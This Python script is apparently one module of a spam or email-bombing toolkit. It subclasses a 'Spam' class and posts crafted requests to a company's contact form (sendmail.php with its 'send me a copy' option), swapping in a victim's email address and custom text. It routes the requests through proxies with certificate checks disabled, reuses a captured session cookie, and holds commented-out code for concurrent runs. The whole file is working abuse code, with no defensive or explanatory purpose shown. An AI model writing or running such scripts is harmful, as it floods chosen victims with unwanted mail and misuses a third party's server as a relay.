from os.path import basename

import requests

from module import Spam

cookies = {
    'PHPSESSID': '7a6e18b182b274a711e78b71734dcffa',
    '__atuvc': '1%7C6',
    '__atuvs': '63e4f213662806dd000',
    '__atssc': 'google%3B1',
}

headers = {
    'Accept': '*/*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    # 'Content-Length': '0',
    # 'Cookie': 'PHPSESSID=7a6e18b182b274a711e78b71734dcffa; __atuvc=1%7C6; __atuvs=63e4f213662806dd000; __atssc=google%3B1',
    'Origin': 'http://www.eurographsl.com',
    'Proxy-Connection': 'keep-alive',
    'Referer': 'http://www.eurographsl.com/index.php?whosend=det&lng=en&id=78663',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        url = f'http://www.eurographsl.com/sendmail.php?who=emash&email=wezxasqw@gmail.com&ephone=test&emess=test&deal=printer&mycopy=1&mash_id=78663&mash_name=test&myfurl=%2Findex.php%3Bwhosend%3Ddet*lng%3Den*id%3D78663&lng=en'.replace(
            'wezxasqw@gmail.com', target).replace('test', self.get_text())
        response = requests.post(
            url,
            cookies=cookies,
            headers=headers,
            verify=False, proxies=self.get_proxies()
        )
        return response


def main():
    spam = ConcreteSpam(basename(__file__)[:-3], 'Thank you.')
    res = spam.send_post()
    # if res:
    #     spam.run_concurrently()


if __name__ == '__main__':
    main()
